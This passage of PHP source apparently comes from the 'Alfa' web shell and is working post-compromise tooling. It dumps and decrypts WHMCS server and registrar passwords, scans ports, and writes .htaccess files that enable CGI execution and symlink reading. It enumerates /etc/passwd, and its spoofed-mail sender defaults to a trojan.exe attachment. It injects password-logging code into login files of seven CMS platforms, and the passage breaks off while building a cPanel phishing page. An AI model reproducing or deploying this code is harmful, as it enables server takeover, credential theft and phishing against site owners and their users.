 array('color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'cc_encryption_hash : ', 'inputName' => 'cc_encryption_hash', 'id' => 'cc_encryption_hash', 'inputValue' => '', 'inputSize' => '50')
);
create_table($table);
echo "<p><input type='submit' value=' ' name='Submit'></p></form></center>";
if($_POST['alfa5']!=''){
$db_host=($_POST['alfa7']);
$db_username=($_POST['alfa3']);
$db_password=($_POST['alfa4']);
$db_name=($_POST['alfa5']);
$cc_encryption_hash=($_POST['alfa6']);
echo __pre();
$conn=@mysqli_connect($db_host,$db_username,$db_password,$db_name) or die(mysqli_error($conn));
$query = mysqli_query($conn,"SELECT * FROM tblservers");
$num = mysqli_num_rows($query);
if ($num > 0){
for($i=0; $i <=$num-1; $i++){
$v = @mysqli_fetch_array($query);
$ipaddress = $v['ipaddress'];
$username = $v['username'];
$type = $v['type'];
$active = $v['active'];
$hostname = $v['hostname'];
echo("<center><table border='1'>");
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td><b><font color=\"#FFFFFF\">Type</font></td><td>$type</td></tr></b>");
echo("<tr><td><b><font color=\"#FFFFFF\">Active</font></td><td>$active</td></tr></b>");
echo("<tr><td><b><font color=\"#FFFFFF\">Hostname</font></td><td>$hostname</td></tr></b>");
echo("<tr><td><b><font color=\"#FFFFFF\">Ip</font></td><td>$ipaddress</td></tr></b>");
echo("<tr><td><b><font color=\"#FFFFFF\">Username</font></td><td>$username</td></tr></b>");
echo("<tr><td><b><font color=\"#FFFFFF\">Password</font></td><td>$password</td></tr></b>");
echo "</table><br><br></center>";
}
$query1 = @mysqli_query($conn,"SELECT * FROM tblregistrars");
$num1 = @mysqli_num_rows($query1);
if ($num1 > 0){
for($i=0; $i <=$num1 -1; $i++){
$v = mysqli_fetch_array($query1);
$registrar = $v['registrar'];
$setting = $v['setting'];
$value = decrypt($v['value'], $cc_encryption_hash);
if ($value==""){
$value=0;
}
echo("<center>Domain Reseller <br><center>");echo("<center><table border='1'>");
echo("<tr><td><b><font color=\"#67ABDF\">Register</font></td><td>$registrar</td></tr></b>");
echo("<tr><td><b><font color=\"#67ABDF\">Setting</font></td><td>$setting</td></tr></b>");
echo("<tr><td><b><font color=\"#67ABDF\">Value</font></td><td>$value</td></tr></b>");
echo "</table><br><br></center>";
}
}
}else{__alert('<font color="red">tblservers is Empty...!</font>');};
}
echo "</div>";
alfafooter();
}
function alfaportscanner(){
alfahead();
echo '<div class=header><center><p><div class="txtfont_header">| Port Scaner |</div></p>
<form action="" method="post" onsubmit="g(\'portscanner\',null,null,this.start.value,this.end.value,this.host.value); return false;">
<input type="hidden" name="y" value="phptools">
<div class="txtfont">Host: </div> <input id="text" type="text" name="host" value="localhost"/>
<div class="txtfont">Port start: </div> <input id="text" size="5" type="text"  name="start" value="80"/>
<div class="txtfont">Port end: </div> <input id="text" size="5" type="text" name="end" value="80"/> <input type="submit" value=" " />
</form></center><br>';
$start = strip_tags($_POST['alfa2']);
$end = strip_tags($_POST['alfa3']);
$host = strip_tags($_POST['alfa4']);
if(isset($_POST['alfa4']) && is_numeric($_POST['alfa3']) && is_numeric($_POST['alfa2'])){
echo __pre();
$packetContent = "GET / HTTP/1.1\r\n\r\n";
if(ctype_xdigit($packetContent))$packetContent = @pack("H*" , $packetContent);
else{
$packetContent = str_replace(array("\r","\n"), "", $packetContent);
$packetContent = str_replace(array("\\r","\\n"), array("\r", "\n"), $packetContent);
}
for($i = $start; $i<=$end; $i++){
$sock = @fsockopen($host, $i, $errno, $errstr, 3);
if($sock){
stream_set_timeout($sock, 5);
fwrite($sock, $packetContent."\r\n\r\n\x00");
$counter = 0;
$maxtry = 1;
$bin = "";
do{
$line = fgets($sock, 1024);
if(trim($line)=="")$counter++;
$bin .= $line;
}while($counter<$maxtry);
fclose($sock);
echo "<center><p>Port <font style='color:#DE3E3E'>$i</font> is open</p>";
echo "<p><textarea style='height:140px;width:50%;'>".$bin."</textarea></p></center>";
}
flush();
}
}
echo '</div>';
alfafooter();
}
function alfacgihtaccess($m,$d='', $symname=false){
$readme = "";
if($symname){$readme="\nReadmeName ".trim($symname);}
if($m=='cgi'){
$code = "#Coded By Sole Sad & Invisible\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .alfa\nAddHandler cgi-script .alfa";
}elseif($m=='sym'){
$code = "#Coded By Sole Sad & Invisible\nOptions Indexes FollowSymLinks\nDirectoryIndex solevisible.phtm\nAddType text/plain php html php4 phtml\nAddHandler text/plain php html php4 phtml{$readme}\nOptions all";
}elseif($m=='shtml'){
$code = "Options +Includes\nAddType text/html .shtml\nAddHandler server-parsed .shtml";
}
@__write_file($d . ".htaccess", $code);
}
function alfabasedir(){
alfahead();
echo '<div class=header>
<center><p><div class="txtfont_header">| Open Base Dir |</div></p></center>';
$passwd = _alfa_file('/etc/passwd');
if(is_array($passwd)){
$users = array();
$makepwd = alfaMakePwd();
$basedir = @ini_get('open_basedir');
$safe_mode = @ini_get('safe_mode');
if(_alfa_can_runCommand(true,false)&&($basedir||$safe_mode)){
$bash = "fZBPSwMxEMXPzacYx9jugkvY9lbpTQ9eFU9NWdYk2wYkWZKsgmu+u9NaS8E/cwgDL/N+M+/yQjxbJ+KO3d4/rHjNusGpZL2DmEITTP/SKlOUIwOqNVTvgLxG2MB0CsGkITioz7X5P9riN60hzhHTvLYn5IoXfbAudYBXUUqHX9wPiEZDZQCj4OM807PIYovlwevHxPiHe0aWmVE7f7BaS4Ws8wEsWAe8UEOCSi+h6moQJinRtzG+6fIGtGeTp8c7Cqo4i4dAFB7xxiGakPdgSxtN6OxA/X7gePk3UtIPiddMe2dOe8wQN7NP";
$tmp_path = alfaWriteTocgiapi("basedir.alfa",$bash);
$bash_users  = alfaEx("cd ".$tmp_path."/alfacgiapi;sh basedir.alfa ".$makepwd,false,true,true);
$users = json_decode($bash_users, true);
$x=count($users);
if($x>=2){array_pop($users);--$x;}
}
if(!$basedir&&!$safe_mode){
$x=0;
foreach($passwd as $str){
$pos = strpos($str,':');
$username = substr($str,0,$pos);
$dirz = str_replace("{user}", $username, $makepwd);
if(($username != '')){
if (@is_readable($dirz)){
array_push($users,$username);
$x++;
}}}
}
echo '<br><br>';
echo "<b><font color=\"#00A220\">[+] Founded ".sizeof($passwd)." entrys in /etc/passwd\n"."<br /></font></b>";
echo "<b><font color=\"#FFFFFF\">[+] Founded ".$x." readable ".str_replace("{user}", "*", $makepwd)." directories\n"."<br /></font></b>";
echo "<b><font color=\"#FF0000\">[~] Searching for passwords in config files...\n\n"."<br /><br /><br /></font></b>";
foreach($users as $user){
if(empty($user))continue;
$path = str_replace("{user}", $user, $makepwd);
echo "<form method=post onsubmit='g(\"FilesMan\",this.c.value,\"\");return false;'><span><font color=#27979B>Change Dir <font color=#FFFF01>..:: </font><font color=red><b>$user</b></font><font color=#FFFF01> ::..</font></font></span><br><input class='foottable' type=text name=c value='$path'><input type=submit value='>>'></form><br>";
}
}else{echo('<b> <center><font color="#FFFFFF">[-] Error : coudn`t read /etc/passwd [-]</font></center></b>');}
echo '<br><br></b>';
echo '</div>';
alfafooter();
}
function alfamail(){
alfahead();
echo '<div class=header>';
AlfaNum(8,9,10);
echo '<center><p><div class="txtfont_header">| Fake Mail |</div></p><form action="" method="post" onsubmit="g(\'mail\',null,this.mail_to.value,this.mail_from.value,this.mail_subject.value,\'>>\',this.mail_content.value,this.count_mail.value,this.mail_attach.value); return false;">';
$table = array(
'td1' => array('color' => 'FFFFFF', 'tdName' => 'Mail To : ', 'inputName' => 'mail_to', 'inputValue' => 'target@fbi.gov', 'inputSize' => '60','placeholder' => true),
'td2' => array('color' => 'FFFFFF', 'tdName' => 'From : ', 'inputName' => 'mail_from', 'inputValue' => 'sec@google.com', 'inputSize' => '60', 'placeholder' => true),
'td3' => array('color' => 'FFFFFF', 'tdName' => 'Subject : ', 'inputName' => 'mail_subject', 'inputValue' => 'your site hacked by me', 'inputSize' => '60'),
'td4' => array('color' => 'FFFFFF', 'tdName' => 'Attach File : ', 'inputName' => 'mail_attach', 'inputValue' => $GLOBALS['cwd'].'trojan.exe', 'inputSize' => '60'),
'td5' => array('color' => 'FFFFFF', 'tdName' => 'Count Mail : ', 'inputName' => 'count_mail', 'inputValue' => '1', 'inputSize' => '60')
);
create_table($table);
echo '<p><div class="txtfont">Message:</div></p><textarea rows="6" cols="60" name="mail_content">Hi Dear Admin :)</textarea><p><input type="submit" value=" " name="mail_send" /></p></form></center>';
if(isset($_POST['alfa4'])&&($_POST['alfa4'] == '>>')){
$mail_to = $_POST['alfa1'];
$mail_from = $_POST['alfa2'];
$mail_subject = $_POST['alfa3'];
$mail_content = $_POST['alfa5'];
$count_mail = (int)$_POST['alfa6'];
$mail_attach = $_POST['alfa7'];
if(filter_var($mail_to, FILTER_VALIDATE_EMAIL)){
if(!empty($mail_attach)&&@is_file($mail_attach)){
$file = $mail_attach;
$content = __read_file($file);
$content = chunk_split(__ZW5jb2Rlcg($content));
$uid = md5(uniqid(time()));
$filename = basename($file);
$headers  = "From: ".$mail_from." <".$mail_from.">\r\n";
$headers .= "To: " . $mail_to. " ( ".$mail_to." ) \r\n";
$headers .= "Reply-To: ".$mail_from."\r\n";
$headers .= "Content-Type: multipart/mixed; boundary=\"".$uid."\"\r\n\r\n";
$headers .= 'MIME-Version: 1.0' . "\r\n";
$headers .= 'X-Mailer: php' . "\r\n";
$mail_content  = "--".$uid."\r\n";
$mail_content .= "Content-type:text/plain; charset=iso-8859-1\r\n";
$mail_content .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
$mail_content .= $mail_content."\r\n\r\n";
$mail_content .= "--".$uid."\r\n";
$mail_content .= "Content-Type: application/octet-stream; name=\"".$filename."\"\r\n";
$mail_content .= "Content-Transfer-Encoding: base64\r\n";
$mail_content .= "Content-Disposition: attachment; filename=\"".$filename."\"\r\n\r\n";
$mail_content .= $content."\r\n\r\n";
$mail_content .= "--".$uid."--";
}else{
$headers  = "From: " . $mail_from. " ( ".$mail_from." ) \r\n";
$headers .= "To: " . $mail_to. " ( ".$mail_to." ) \r\n";
$headers .= 'Reply-To: '.$mail_from.'' . "\r\n";
$headers .= 'Content-type: text/html; charset=utf-8' . "\r\n";
$headers .= 'MIME-Version: 1.0' . "\r\n";
$headers .= 'X-Mailer: php' . "\r\n";
}
if(empty($count_mail)||$count_mail<1)$count_mail=1;
if(!empty($mail_from)){echo __pre();
for($i=1;$i<=$count_mail;$i++){
if(@mail($mail_to,$mail_subject,$mail_content,$headers))echo("<center>Sent -> $mail_to<br></center>");
}}else{__alert("Invalid Mail From !");}
}else{__alert("Invalid Mail To !");}
}
echo('</div>');
alfafooter();
}
function alfaziper(){
alfahead();
AlfaNum(8,9,10);
echo '<div class=header><p><center><p><div class="txtfont_header">| Compressor |</div></p>
<form onSubmit="g(\'ziper\',null,null,null,this.dirzip.value,this.zipfile.value,\'>>\');return false;" method="post">
<div class="txtfont">Dir/File: </div> <input type="text" name="dirzip" value="'.(!empty($_POST['alfa3'])?htmlspecialchars($_POST['alfa3']):htmlspecialchars($GLOBALS['cwd'])).'" size="60"/>
<div class="txtfont">Save Dir: </div> <input type="text" name="zipfile" value="'.$GLOBALS['cwd'].'alfa.zip" size="60"/>
<input type="submit" value=" " name="ziper" />
</form></center></p>';
if(isset($_POST['alfa5']) && ($_POST['alfa5'] == '>>')){
$dirzip = $_POST['alfa3'];
$zipfile = $_POST['alfa4'];
if($GLOBALS['sys']!='unix'&&_alfa_can_runCommand(true,true)){
alfaEx("powershell Compress-Archive -Path '".addslashes($dirzip)."' -DestinationPath '".addslashes(basename($zipfile))."'");
echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font></b></p></center>';
}elseif($GLOBALS['sys']=='unix'&&_alfa_can_runCommand(true,true)){
alfaEx("cd '".addslashes(dirname($zipfile))."';zip -r '".addslashes(basename($zipfile))."' '".addslashes($dirzip)."'");
echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font></b></p></center>';
}elseif(class_exists('ZipArchive')){
if(__alfaziper($dirzip, $zipfile)){
echo __pre().'<center><p><font color="green">Success...!<br>'.$zipfile.'</font></p></center>';
}else{echo __pre().'<center><p><font color="red">ERROR!!!...</font></p></center>';}
}
}
echo '</div>';
alfafooter();
}
function __alfaziper($source,$destination){
	if(!extension_loaded('zip')||!file_exists($source)){
		return false;
	}
	$zip=new ZipArchive();
	if(!$zip->open($destination,ZIPARCHIVE::CREATE)){
		return false;
	}
	$source=str_replace('\\','/',realpath($source));
	if(is_dir($source)===true){
		$files=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source),RecursiveIteratorIterator::SELF_FIRST);
		foreach($files as $file){
			$file=str_replace('\\','/',$file);
			if(in_array(substr($file,strrpos($file,'/')+1),array('.','..')))continue;
			$file=realpath($file);
			if(is_dir($file)===true){
				$zip->addEmptyDir(str_replace($source.'/','',$file.'/'));
			}else if(is_file($file)===true){
				$zip->addFromString(str_replace($source.'/','',$file),file_get_contents($file));
			}
		}
	}else if(is_file($source)===true){
		$zip->addFromString(basename($source),file_get_contents($source));
	}
	return $zip->close();
}
function alfadeziper(){
alfahead();
AlfaNum(8,9,10);
echo '<div class=header><p><center><p><div class="txtfont_header">| DeCompressor |</div></p>
<form onSubmit="g(\'deziper\',null,null,null,this.dirzip.value,this.zipfile.value,\'>>\');return false;" method="post">
<div class="txtfont">File: </div> <input type="text" name="dirzip" value="'.(!empty($_POST['alfa3'])?htmlspecialchars($_POST['alfa3']):htmlspecialchars($GLOBALS['cwd'])).'" size="60"/>
<div class="txtfont">Extract To: </div> <input type="text" name="zipfile" value="'.$GLOBALS['cwd'].'" size="60"/>
<input type="submit" value=" " name="ziper" />
</form></center></p>';
if(isset($_POST['alfa5']) && ($_POST['alfa5'] == '>>')){
$dirzip = $_POST['alfa3'];
$zipfile = $_POST['alfa4'];
if(@!is_dir($zipfile)){
	@mkdir($zipfile, 0777, true);
}
$finfo = "";
$file_type = "";
if(function_exists('finfo_open')){
$finfo = @finfo_open(FILEINFO_MIME_TYPE);
$file_type = @finfo_file($finfo, $dirzip);
@finfo_close($finfo);
}else{
	if($GLOBALS['sys']=='unix'&&_alfa_can_runCommand(true,true)){
		$file_type = alfaEx('file -b --mime-type ' . $dirzip);
	}
}
if($GLOBALS['sys']!='unix'&&_alfa_can_runCommand(true,true)){
alfaEx("powershell expand-archive -path '".addslashes($dirzip)."' -destinationpath '".addslashes(basename($zipfile))."'");
echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font></b></p></center>';
}elseif($GLOBALS['sys']=='unix'&&!empty($file_type)&&_alfa_can_runCommand(true,true)&&(strlen(alfaEx('which unzip')) > 0||strlen(alfaEx('which tar')) > 0||strlen(alfaEx('which gunzip')) > 0)){
switch ($file_type) {
	case 'application/zip':
		alfaEx("cd '".addslashes($zipfile)."';unzip '".addslashes($dirzip)."'");
	break;
	case 'application/x-tar': case 'application/x-gzip': case 'application/x-gtar':
		if(strstr(basename($dirzip), ".tar.gz")||strstr(basename($dirzip), ".tar")){
			alfaEx("cd '".addslashes($zipfile)."';tar xzf '".addslashes($dirzip)."'");
		}else{
			alfaEx("cd '".addslashes($zipfile)."';gunzip '".addslashes($dirzip)."'");
		}
	break;
}
echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font> <a style="cursor:pointer;" onclick="g(\'FilesMan\',\''.$zipfile.'\');">[ View Folder ]</a></b></p></center>';
}elseif(class_exists('ZipArchive')){
	$itsok = false;
	if(emtpy($file_type)){
		$file_type = "application/zip";
	}
	switch ($file_type) {
		case 'application/zip':
			$zip = new ZipArchive;
			$res = $zip->open($dirzip);
			if ($res) {
				$zip->extractTo($zipfile);
				$zip->close();
				$itsok = true;
			}
		break;
		case 'application/x-tar': case 'application/x-gzip': case 'application/x-gtar':
			if(strstr(basename($dirzip), ".tar.gz")){
				$new_file = $zipfile .'/'. basename($dirzip);
				@copy($dirzip, $new_file);
				$new_tar = str_replace(".tar.gz", ".tar", $new_file);
				try {
					$p = new PharData($new_file);
					$p->decompress();
					$phar = new PharData($new_tar);
					$phar->extractTo($zipfile);
					@unlink($new_file);
					@unlink($new_tar);
					$itsok = true;
				} catch (Exception $e) {
				}
			}else{
				try {
					$phar = new PharData($dirzip);
					$phar->extractTo($zipfile);
					$itsok = true;
				} catch (Exception $e) {
				}
			}
		break;
	}
if($itsok){
echo __pre().'<center><p><font color="green">Success...!<br>'.$zipfile.'</font> <a style="cursor:pointer;" onclick="g(\'FilesMan\',\''.$zipfile.'\');">[ View Folder ]</a></p></center>';
}else{echo __pre().'<center><p><font color="red">ERROR!!!...</font></p></center>';}
}
}
echo '</div>';
alfafooter();
}
function alfacmshijacker(){
alfahead();
AlfaNum(5,6,7,8,9,10);
echo '<div class=header><br>
<center><div class="txtfont_header">| Cms Hijacker |</div><br><br><form onSubmit="g(\'cmshijacker\',null,this.cmshi.value,this.saveto.value,\'>>\',this.cmspath.value);return false;" method=\'post\'>
<div class="txtfont">CMS: <select style="width:100px;" name="cmshi">';
$cm_array = array("vb"=>"vBulletin","wp"=>"wordpress","jom"=>"joomla","whmcs"=>"whmcs","mybb"=>"mybb","ipb"=>"ipboard","phpbb"=>"phpbb");
foreach($cm_array as $key=>$val)echo '<option value="'.$key.'">'.$val.'</option>';
echo("</select>");
echo ' Path installed cms: <input size="50" type="text" name="cmspath" placeholder="ex: /home/user/public_html/vbulletin/">
SaveTo: <input size="50" type="text" name="saveto" value="'.$GLOBALS['cwd'].'alfa.txt"></font>
<input type="submit" name="btn" value=" "></form></center><br>';
$cms = $_POST['alfa1'];
$saveto = $_POST['alfa2'];
$cmspath = $_POST['alfa4'];
if(!empty($cms) AND !empty($saveto) AND $_POST['alfa4'] AND $_POST['alfa3'] == '>>'){
echo __pre();
alfaHijackCms($cms,$cmspath,$saveto);
}
echo '</div>';
alfafooter();
}
function alfaHijackCms($cms,$cmspath,$saveto){
switch($cms){
case "vb":
hijackvBulletin($cmspath,$saveto);
break;
case "wp":
hijackwp($cmspath,$saveto);
break;
case "jom":
hijackJoomla($cmspath,$saveto);
break;
case "whmcs":
hijackWhmcs($cmspath,$saveto);
break;
case "mybb":
hijackMybb($cmspath,$saveto);
break;
case "ipb":
hijackIPB($cmspath,$saveto);
break;
case "phpbb":
hijackPHPBB($cmspath,$saveto);
break;
default:
echo "error!";
break;
}
}
function hijackvBulletin($path,$saveto){
$code='$alfa_username = strtolower($vbulletin->GPC["vb_login_username"]);$alfa_password = $vbulletin->GPC["vb_login_password"];$alfa_file = "{saveto_path}";$sql_query = $vbulletin->db->query_read("SELECT * FROM " . TABLE_PREFIX . "user WHERE `username`=\'" . $alfa_username . "\'");while($row = $vbulletin->db->fetch_array($sql_query)){if(strlen($alfa_password) > 1 AND strlen($alfa_username) > 1){$fp1 = @fopen($alfa_file, "a+");@fwrite($fp1, $alfa_username . \' : \' .  $alfa_password." (" . $row["email"] . ")\n");@fclose($fp1); $f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}}';
$clearpw = 'defined(\'DISABLE_PASSWORD_CLEARING\')';
$code=str_replace('{saveto_path}',$saveto,$code);
$login = $path."/login.php";
$class = $path."/includes/class_bootstrap.php";
$dologin = 'do_login_redirect();';
$evil_login = "\t".$code."\n\t".$dologin;
$evil_class = "true";
if((@is_file($login) AND @is_writable($login)) || (@is_file($class) AND @is_writable($class))){
$data_login = @file_get_contents($login);
$data_class = @file_get_contents($class);
if(strstr($data_login, $dologin) || strstr($data_class, $clearpw)){
$login_replace = str_replace($dologin,$evil_login, $data_login);
$class_replace = str_replace($clearpw,$evil_class, $data_class);
@file_put_contents($login, $login_replace);
@file_put_contents($class, $class_replace);
hijackOutput(0,$saveto);
}else{
hijackOutput(1);
}
}else{
hijackOutput(1);
}
}
function hijackwp($path,$saveto){
$code = '$alfa_file="{saveto_path}";$fp = fopen($alfa_file, "a+");fwrite($fp, $_POST[\'log\']." : ".$_POST[\'pwd\']." (".($user->user_email).")\n");fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);';
$redirect_wp = '#if[ ]{0,}\([ ]{0,}![ ]{0,}is_wp_error\([ ]{0,}\$user[ ]{0,}\)[ ]{0,}&&[ ]{0,}![ ]{0,}\$reauth[ ]{0,}\)[ ]{0,}{#';
$code=str_replace('{saveto_path}',$saveto,$code);
$login=$path."/wp-login.php";
if(@is_file($login) AND @is_writable($login)){
$data_login = @file_get_contents($login);
if(@preg_match($redirect_wp, $data_login, $match)){
$evil_login = "\t".$match[0]."\n\t".$code;
$login_replace = @preg_replace($redirect_wp,$evil_login, $data_login);
@file_put_contents($login, $login_replace);
hijackOutput(0,$saveto);
}else{
hijackOutput(1);
}
}else{
hijackOutput(1);
}
}
function hijackJoomla($path,$saveto){
$code = '<?php jimport(\'joomla.user.authentication\');$Alfa_auth = & JAuthentication::getInstance();$Alfa_data = array(\'username\'=>$_POST[\'username\'],\'password\'=>$_POST[\'passwd\']);$Alfa_options = array();$Alfa_response = $Alfa_auth->authenticate($Alfa_data, $Alfa_options);if($Alfa_response->status == 1){$alfa_file="{saveto_path}";$fp=@fopen($alfa_file,"a+");@fwrite($fp, $Alfa_response->username.":".$_POST[\'passwd\']." ( ".$Alfa_response->email." )\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}?>';
$code=str_replace('{saveto_path}',$saveto,$code);
$comp=$path."/administrator/components/com_login/";
if(@is_file($comp."/login.php")){
$login = $comp."/login.php";
}elseif(@is_file($comp."/admin.login.php")){
$login = $comp."/admin.login.php";
}else{
$login = '';
}
if(@is_file($login) AND @is_writable($login) AND $login != ''){
$data_login = @file_get_contents($login);
$evil_login = $code."\n".$data_login;
@file_put_contents($login, $evil_login);
hijackOutput(0,$saveto);
}else{
hijackOutput(1);
}
}
function hijackWhmcs($path,$saveto){
$code = '<?php if(isset($_POST[\'username\']) AND isset($_POST[\'password\']) AND !empty($_POST[\'username\']) AND !empty($_POST[\'password\'])){if($alfa_connect=@mysqli_connect($db_host,$db_username,$db_password,$db_name)){$alfa_file = "{saveto_path}";$alfa_uname = @$_POST[\'username\'];$alfa_pw = @$_POST[\'password\'];if(isset($_POST[\'language\'])){$alfa_q = "SELECT * FROM tbladmins WHERE `username` = \'$alfa_uname\' AND `password` = \'".md5($alfa_pw)."\'";$admin = true;}else{$alfa_q = "SELECT * FROM tblclients WHERE `email` = \'$alfa_uname\'";$admin = false;}$alfa_query = mysqli_query($alfa_connect, $alfa_q);if(mysqli_num_rows($alfa_query) > 0 ){$row = mysqli_fetch_array($alfa_query);$allow = true;if(!$admin){$__salt = explode(\':\', $row[\'password\']);$__encPW = md5($__salt[1].$_POST[\'password\']).\':\'.$__salt[1];if($row[\'password\'] == $__encPW){$allow = true;$row[\'username\'] = $row[\'email\'];}else{$allow = false;}}if($allow){$fp = @fopen($alfa_file, "a+");@fwrite($fp, $row[\'username\'] . \' : \' .  $alfa_pw." (" . $row["email"] . ") : ".($admin ? \'is_admin\' : \'is_user\')."\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fwrite($fp, $values);}@fclose($fp);}}}}?>';
$code=str_replace('{saveto_path}',$saveto,$code);
$conf=$path."/configuration.php";
if(@is_file($conf) AND @is_writable($conf)){
$data_conf = @file_get_contents($conf);
if(!strstr($data_conf,'?>'))$code = '?>'.$code;
$evil_conf = $data_conf."\n".$code;
@file_put_contents($conf, $evil_conf);
hijackOutput(0,$saveto);
}else{
hijackOutput(1);
}
}
function hijackMybb($path,$saveto){
$code = '$alfa_q = $db->query("SELECT `email` FROM ".TABLE_PREFIX."users WHERE `username` = \'".$user[\'username\']."\'");$alfa_fetch = $db->fetch_array($alfa_q);$alfa_file = "{saveto_path}";$fp = @fopen($alfa_file, "a+");@fwrite($fp, $user[\'username\']." : ". $user[\'password\']." ( ".$alfa_fetch[\'email\']." )\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fwrite($fp, $values);}@fclose($fp);';
$find = '$loginhandler->complete_login();';
$code=str_replace('{saveto_path}',$saveto,$code);
$login=$path."/member.php";
$evil_login = "\t".$code."\n\t".$find;
if(@is_file($login) AND @is_writable($login)){
$data_login = @file_get_contents($login);
if(strstr($data_login, $find)){
$login_replace = str_replace($find,$evil_login, $data_login);
@file_put_contents($login, $login_replace);
hijackOutput(0,$saveto);
}else{
hijackOutput(1);
}
}else{
hijackOutput(1);
}
}
function hijackIPB($path,$saveto){
$code = '$Alfa_q = $this->DB->buildAndFetch(array(\'select\' => \'email\', \'from\' => \'members\', \'where\' => \'name="\'.$username.\'" OR email="\'.$email.\'"\'));$Alfa_file = "{saveto_path}";$fp = @fopen($Alfa_file, "a+");@fwrite($fp, $_POST[\'ips_username\'].\' : \'.$_POST[\'ips_password\'].\' ( \'.$Alfa_q[\'email\'].\' )\'."\n");@fclose($fp);$f = @file($Alfa_file);$new = array_unique($f);$fp = @fopen($Alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);';
$find = 'unset( $member[\'plainPassword\'] );';
$code=str_replace('{saveto_path}',$saveto,$code);
$login=$path."/admin/sources/handlers/han_login.php";
$evil_login = "\t".$find."\n\t".$code;
if(@is_file($login) AND @is_writable($login)){
$data_login = @file_get_contents($login);
if(strstr($data_login, $find)){
$login_replace = str_replace($find,$evil_login, $data_login);
@file_put_contents($login, $login_replace);
hijackOutput(0,$saveto);
}else{
hijackOutput(1);
}
}else{
hijackOutput(1);
}
}
function hijackPHPBB($path,$saveto){
$code = '$Alfa_u = request_var(\'username\', \'\');$Alfa_p = request_var(\'password\', \'\');if($Alfa_u != \'\' AND $Alfa_p != \'\'){$Alfa_response = $auth->login($Alfa_u,$Alfa_p);if($Alfa_response[\'status\'] == LOGIN_SUCCESS){$Alfa_file ="{saveto_path}";$fp = @fopen($Alfa_file, "a+");@fwrite($fp, $Alfa_u." : ".$Alfa_p. " ( ".$Alfa_response[\'user_row\'][\'user_email\']." )\n");@fclose($fp);$f = @file($Alfa_file);$new = array_unique($f);$fp = @fopen($Alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}}';
$find = 'case \'login\':';
$code=str_replace('{saveto_path}',$saveto,$code);
$login=$path."/ucp.php";
$evil_login = "\t".$find."\n\t".$code;
if(@is_file($login) AND @is_writable($login)){
$data_login = @file_get_contents($login);
if(strstr($data_login, $find)){
$login_replace = str_replace($find,$evil_login, $data_login);
@file_put_contents($login, $login_replace);
hijackOutput(0,$saveto);
}else{
hijackOutput(1);
}
}else{
hijackOutput(1);
}
}
function hijackOutput($c=0,$p=''){echo($c==0?"<center><font color='green'>Success</font> --> path: $p</center>":'<center><font color="red">Error in inject code !</font></center>');}
function Alfa_StrSearcher($dir,$string,$ext,$e,$arr=array()){
if(@is_dir($dir)){
$files=@scandir($dir);
foreach($files as $key => $value){
$path=@realpath($dir. DIRECTORY_SEPARATOR .$value);
if(!@is_dir($path)){
if($ext!='*'){$f = basename($path);$f = explode('.',$f);$f = end($f);if($f!=$ext)continue;}
if($e=='str'){
$content = @file_get_contents($path);
if(strpos($content, $string) !== false){
echo str_replace('\\','/',$path) . "<br>";
}
}else{
if(strstr($value,$string)){
echo str_replace('\\','/',$path) . "<br>";
}
}
$results[] = $path;
}elseif($value != "." && $value != "..") {
Alfa_StrSearcher($path,$string,$ext,$e,$results);
$results[] = $path;
}}}}
function alfafakepage(){
	alfahead();
	AlfaNum(9,10);
	echo '<div class=header><br>
	<center><div class="txtfont_header">| Host Manager Fake page |</div></center><br><br><form onSubmit="g(\'fakepage\',null,this.clone_page.value,this.fake_root.value,\'>>\',this.logto.value,this.panel.value,this.inject_to.value,this.bind_on.value,this.count.value);return false;" method=\'post\'>
	<div class="txtfont" style="position: relative;left: 50%;transform: translate(-50%);"><div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Panel: </span><select style="width:100px;" name="panel">';
	$cm_array = array("cpanel"=>"Cpanel","directadmin"=>"DirectAdmin");
	foreach($cm_array as $key=>$val)echo '<option value="'.$key.'">'.$val.'</option>';
	echo("</select></div>");
	echo '<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Clone page: </span><input size="50" type="text" name="clone_page" placeholder="eg: https://target.com:2083 | https://target.com:2222"></div>
	<div style="margin-bottom:6px;"><span>Fake page root: </span><input size="50" type="text" name="fake_root" value="'.$_SERVER["DOCUMENT_ROOT"].'/fake_page_root/"></div>
	<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Inject to: </span><input size="50" type="text" name="inject_to" value="'.$_SERVER["DOCUMENT_ROOT"].'/index.php"></div>
	<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Bind on: </span><input size="50" type="text" name="bind_on" placeholder="eg: '.$_SERVER["DOCUMENT_ROOT"].'/wp-login.php"></div>
	<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Log To: </span><input size="50" type="text" name="logto" value="'.$GLOBALS['cwd'].'logs.txt"></div>
	<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Count of Invalid login: </span><input size="20" type="text" name="count" value="3" style="text-align:center;"></div>
	<div style="text-align:center;"><input type="submit" name="btn" value=" "></div></div></form><br>';
